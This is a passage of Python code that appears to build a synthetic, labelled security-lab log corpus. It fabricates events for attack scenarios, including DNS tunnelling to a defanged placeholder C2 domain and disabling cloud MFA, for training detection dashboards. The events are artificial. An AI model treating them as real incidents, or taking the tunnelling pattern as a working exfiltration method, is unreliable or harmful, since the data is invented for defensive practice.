            S.CLOUD_SOURCE_IP: EXTERNAL_EXFIL_IP,
            S.MESSAGE: "MFA device deactivated for root user",
        }
        out.append(self._emit(S.SRC_CLOUD, f, ground_truth=True, scenario="cloud_misconfig",
                              labels={"stage": "mfa_disabled"}))
        return out

    # =====================================================================
    # Scenario 7 - DNS tunnelling
    # =====================================================================
    def scenario_dns_tunnel(self) -> list[Event]:
        """T1048.003 - long high-entropy TXT queries to a suspicious domain."""
        out: list[Event] = []
        self.now = LAB_START + timedelta(days=6, hours=4, minutes=20)
        base = "tunnel.acme-c2[.]net"
        for i in range(8):
            self.now += timedelta(seconds=25)
            payload = "".join(self.rng.choice("0123456789abcdef") for _ in range(58))
            f = {
                **self._host_fields("WKS-ENG-021"),
                **self._user_fields("m.kulkarni"),
                S.EVENT_CATEGORY: S.CAT_DNS,
                S.EVENT_TYPE: "connection",
                S.EVENT_CODE: "22",
                S.EVENT_ID: "22",
                S.EVENT_OUTCOME: "success",
                S.DNS_QUERY: f"{payload}.{base}",
                S.DST_IP: EXTERNAL_C2_IP,
                S.MESSAGE: "DNS query for TXT record",
            }
            out.append(self._emit(S.SRC_SYSMON, f, ground_truth=True, scenario="dns_tunnel",
                                  labels={"stage": "exfiltration"}))
        return out

    # =====================================================================
    # Assembly
    # =====================================================================
    def build(self, benign_count: int = 220) -> list[Event]:
        self.benign_background(benign_count)
        self.benign_mistyped_password()
        self.scenario_brute_force()
        self.scenario_phishing()
        self.scenario_powershell_evasion()
        self.scenario_lateral_movement()
        self.scenario_ransomware()
        self.scenario_cloud_misconfig()
        self.scenario_dns_tunnel()
        # Interleave the whole corpus on the timeline so the dashboard looks
        # like a real week's worth of data.
        self._events.sort(key=lambda e: e.timestamp)
        return self._events


def generate_corpus(seed: int = 1337, benign_count: int = 220) -> list[Event]:
    """Return the full labelled lab corpus."""
    return LogGenerator(seed=seed).build(benign_count=benign_count)


SCENARIO_STAGES = {
    "brute_force": ["password_spray", "brute_force", "successful_logon"],
    "phishing": ["delivery", "click", "credential_entry", "payload_staged"],
    "powershell_evasion": ["execution", "script_block", "defence_evasion", "persistence"],
    "lateral_movement": ["remote_logon", "share_access", "remote_service", "new_account", "priv_esc"],
    "ransomware": ["recovery_disable", "encryption", "exfiltration"],
    "cloud_misconfig": ["public_bucket", "privilege_escalation", "mfa_disabled"],
    "dns_tunnel": ["exfiltration"],
}
